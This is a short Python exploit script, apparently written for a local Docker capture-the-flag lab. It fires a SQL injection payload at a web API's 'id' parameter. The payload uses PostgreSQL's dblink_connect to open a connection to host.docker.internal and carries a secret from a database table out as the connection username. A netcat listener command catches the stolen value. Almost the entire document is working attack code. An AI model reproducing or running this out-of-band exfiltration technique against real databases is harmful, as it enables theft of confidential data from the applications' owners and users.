import socket
import requests

LISTENER_PORT = 9000
BASE = 'http://localhost/api/oob'

try:
    ip = socket.gethostbyname('host.docker.internal')
    print(f"[+] host.docker.internal -> {ip} (Docker Desktop / host-gateway active)")
except socket.gaierror:
    print("[~] host.docker.internal does not resolve on this host")
    print("    The DB container reaches your machine via extra_hosts host-gateway — that's fine")
    print("    Make sure compose.yml has 'extra_hosts: host-gateway' on the db service")

print(f"[*] Run: nc -lvnp {LISTENER_PORT}")
print("[*] Firing payload...")

payload = f"1 AND dblink_connect('host=host.docker.internal port={LISTENER_PORT} dbname=postgres user=' || (SELECT segredo FROM oob_relatorio_secreto LIMIT 1) || ' password=x sslmode=disable') IS NOT NULL"
r = requests.get(BASE, params={'id': payload})
print(f"[+] HTTP {r.status_code} — flag arrives in the startup packet username field on your nc listener")
